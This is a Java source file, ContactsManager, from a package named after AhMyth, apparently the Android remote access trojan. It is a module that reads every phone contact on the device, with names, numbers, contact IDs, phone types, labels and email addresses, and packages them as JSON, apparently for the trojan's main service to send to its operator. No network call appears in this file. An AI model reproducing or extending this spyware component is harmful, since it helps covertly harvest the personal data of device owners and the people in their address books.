package ahmyth.mine.king.ahmyth;

import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/11/16.
 */

public class ContactsManager {

    public static JSONObject getContacts(){

        try {
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] { 
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, 
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Phone.TYPE,
                        ContactsContract.CommonDataKinds.Phone.LABEL
                    }, 
                    null, null,  
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");


            while (cur.moveToNext()) {
                JSONObject contact = new JSONObject();
                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                
                contact.put("phoneNo", num);
                contact.put("name", name);
                
                // Enhanced metadata
                try {
                    contact.put("contactId", cur.getLong(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)));
                    contact.put("phoneType", cur.getInt(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));
                    contact.put("phoneLabel", cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LABEL)));
                    
                    // Try to get email
                    try {
                        Cursor emailCur = MainService.getContextOfApplication().getContentResolver().query(
                                CommonDataKinds.Email.CONTENT_URI,
                                new String[]{CommonDataKinds.Email.DATA},
                                CommonDataKinds.Email.CONTACT_ID + " = ?",
                                new String[]{String.valueOf(contact.get("contactId"))},
                                null);
                        if (emailCur != null && emailCur.moveToFirst()) {
                            contact.put("email", emailCur.getString(emailCur.getColumnIndex(CommonDataKinds.Email.DATA)));
                            emailCur.close();
                        }
                    } catch (Exception emailEx) {
                        // Email may not be available
                    }
                } catch (Exception e) {
                    // Some fields may not be available
                }
                
                list.put(contact);

            }
            if (cur != null) cur.close();
            contacts.put("contactsList", list);
            return contacts;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }

}
